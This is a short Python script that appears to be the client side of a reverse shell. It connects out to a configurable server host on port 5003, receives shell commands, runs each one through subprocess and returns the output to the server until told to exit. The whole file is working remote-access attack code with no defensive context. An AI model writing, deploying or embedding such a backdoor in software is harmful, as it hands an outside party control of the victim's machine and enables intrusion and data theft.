import socket
import subprocess
import sys

SERVER_HOST = "CHANGE" #servers host name which is the PC your listening as
SERVER_PORT = 5003
BUFFER_SIZE = 1024

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

#message receive
message = s.recv(BUFFER_SIZE).decode()
print("server:", message)

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command.lower() == "exit":
        print(f"Connection closed!")
        break
    #execute command and retrieve results
    output = subprocess.getoutput(command)
    #send results back to see server
    s.send(output.encode())

s.close()
